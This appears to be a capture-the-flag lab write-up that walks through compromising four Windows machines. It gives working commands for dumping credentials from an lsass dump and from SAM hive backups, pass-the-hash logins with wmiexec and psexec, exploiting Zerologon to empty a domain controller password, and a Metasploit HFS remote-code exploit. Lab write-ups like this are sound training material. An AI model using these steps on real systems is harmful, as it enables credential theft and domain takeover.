# Windows LAB 1

### Machine 1
After making a quick  port scan with nmap:

    nmap -Pn <target_ip>
![](https://i.ibb.co/6H8pkPh/Screen-Shot-2022-12-29-at-9-23-03-AM.png)
We can see that there is some opened ports, including an 80 http port.
So we go to our browser to check it out.
![enter image description here](https://i.ibb.co/Vm5gJJt/Screen-Shot-2022-12-29-at-9-29-03-AM.png)
After accessing the address, we see an enumeration of a directory and two other files, we enter to the dumps directory and there it is:
![](https://i.ibb.co/wcpHG80/Screen-Shot-2022-12-29-at-9-32-25-AM.png)An interesting files ```lsass.DMP``` that can be very helpful to find some hashes or passwords, so we click on it to download and go to our terminal to see if there is anything we can do.

First what is ```Lsass```:

> The Local Security Authority Subsystem Service (LSASS) is a process in
> Microsoft Windows operating systems that is responsible for enforcing
> the security policy on the system, such as verifying users during
> users logons and password changes.

And LSASS.DMP is a file that is created when the (LSASS) process on Windows system crashes. When it crashes, it generates a memory dump file that contains information about the state of the system at the time of the crash, like we said users logons and password changes.
So if we are lucky enough, we can find some NTLM hashes or any plain text password.
To extract the informations from the file we used a tool called ```pypykatz```, so we type our command:

    pypykatz lsa minidump lsass.DMP
![enter image description here](https://i.ibb.co/52PyX1T/Screen-Shot-2022-12-29-at-10-08-58-AM.png)
There it is an NT hash for an Administrator user, so let's sign in with this username and NT hash using wmiexec.py

     wmiexec.py -hashes :78f9261c7b0f08bd9a3b3b13340e4c2a Administrator@<targer_ip>
![enter image description here](https://i.ibb.co/BNnPpk6/Screen-Shot-2022-12-29-at-10-15-12-AM.png)
There it is we got access successfully, now we just need to look for our flag that i found in C:\Users\Administrator\Desktop.

### Machine 2

First thing we do a quick port enumeration with nmap:

    nmap -Pn 172.16.4.161

![enter image description here](https://i.ibb.co/0JZy77D/Screen-Shot-2022-12-29-at-10-39-19-AM.png)Nothing special here, what we can do is to look for any opened shares in this machine, to list the shares we use

    smbclient -L <target_ip>
![enter image description here](https://i.ibb.co/7V9Q4Q3/Screen-Shot-2022-12-29-at-10-43-36-AM.png)We can see that there is 4 different shares, but there is one that we can access without credentials, it's the backup share.
So we access it with ```smbclient```

    smbclient \\\\<target_ip>\\Backup
We press enter for the password and we are in, we try ```ls``` to enumerate if there is any files.
![enter image description here](https://i.ibb.co/882ZqZG/Screen-Shot-2022-12-29-at-10-49-08-AM.png)We try to download the files with the get command, ```get <file>```.

The SAM.SAVE, SYSTEM.SAVE, and SECURITY.SAVE files are all related in that they are backup copies of system-level registry hives on a Windows system.

The SAM.SAVE file is a backup copy of the Security Account Manager (SAM) registry hive, which contains information about user accounts on the system, including user names, passwords, and security identifiers (SIDs).

The SYSTEM.SAVE file is a backup copy of the SYSTEM registry hive, which contains important system-level configuration information, including information about device drivers, system services, and other system components.

The SECURITY.SAVE file is a backup copy of the SECURITY registry hive, which contains security-related information for the system, including access control lists (ACLs) and security policies.

To dump some informations from this files we use ```secretsdump.py```

    secretsdump.py -sam sam.save -system system.save -security security.save LOCAL

SecretsDump should extract information from the SAM.SAVE, SYSTEM.SAVE, and SECURITY.SAVE files and that it should perform the extraction locally on the system where the command is being run.

![enter image description here](https://i.ibb.co/JFgSTyS/Screen-Shot-2022-12-29-at-11-35-00-AM.png)There it is, the NTLM hash of The Administrator user, so now we gonna try to get a shell using this hash with psexec.

    psexec.py -hashes <NTLM_Hash> <user>@<target_ip> cmd.exe

![enter image description here](https://i.ibb.co/VY3nVkP/Screen-Shot-2022-12-29-at-11-42-42-AM.png)And congratulation we got the shell, now go and find your flag.

### Machine 3

For this machine, i tried to test the Zerologon vulnerability.
First, we need to test if this machine is vulnerable to Zerologon, to test it, we can use a script that you can find here: [Zerologon_tester](https://github.com/SecuraBV/CVE-2020-1472)
So we run the script :

    python3 zerologon_tester.py DC-NAME <target_ip>
   
We can get the DC-NAME or Domain Controller name, with an nmap scan:

    nmap -A -Pn <target_ip>
![enter image description here](https://i.ibb.co/r2F4y6n/Screen-Shot-2022-12-29-at-1-14-32-PM.png)

And the Name is ```SRV-DC1```, so now we run the script:
![enter image description here](https://i.ibb.co/QmT3Gry/Screen-Shot-2022-12-29-at-1-17-21-PM.png)

So it can be exploit it, now to use it we gonna run this script: [Zerologon_exploit](https://github.com/risksense/zerologon)
The command gonna look like this:

    python3 set_empty_pw.py <DC-NAME> <target_ip>
   
![enter image description here](https://i.ibb.co/yYWR0RL/Screen-Shot-2022-12-29-at-1-31-40-PM.png)

That was successful now we gonna dump the hashes with ```secretsdump.py```

    secretsdump.py -just-dc <DC-NAME>\$@<target_ip>

We can grep the Administrator hash directly:

![enter image description here](https://i.ibb.co/VNn9Y6k/Screen-Shot-2022-12-29-at-1-41-33-PM.png)

And there it is, now we can log as Administrator using the NTLM hash with ```psexec.py```:

    psexec.py -hashes <NTLM_Hash> <user>@<target_ip> cmd.exe

![enter image description here](https://i.ibb.co/ynLYSPT/Screen-Shot-2022-12-29-at-1-45-14-PM.png)

Here we go, you can search for the flag.

### Machine 4

First of all, we start with out nmap scan

    nmap -A -Pn <target_ip>

We found an http port used by HttpFileServer httpd 2.3, we do a quick google search and we found this article, that gonna help us getting a remote command execution, you can find it here : [Article
](https://www.infosecmatter.com/metasploit-module-library/?mm=exploit/windows/http/rejetto_hfs_exec)
Now we gonna our metasploit console to use ``exploit/windows/http/rejetto_hfs_exec``, we set the target host using ```set RHOSTS <target_ip>``` and  run exploit, There it is we got a shell

![enter image description here](https://i.ibb.co/fCmRD9F/Screen-Shot-2022-12-29-at-2-21-36-PM.png)So you should find the flag now.
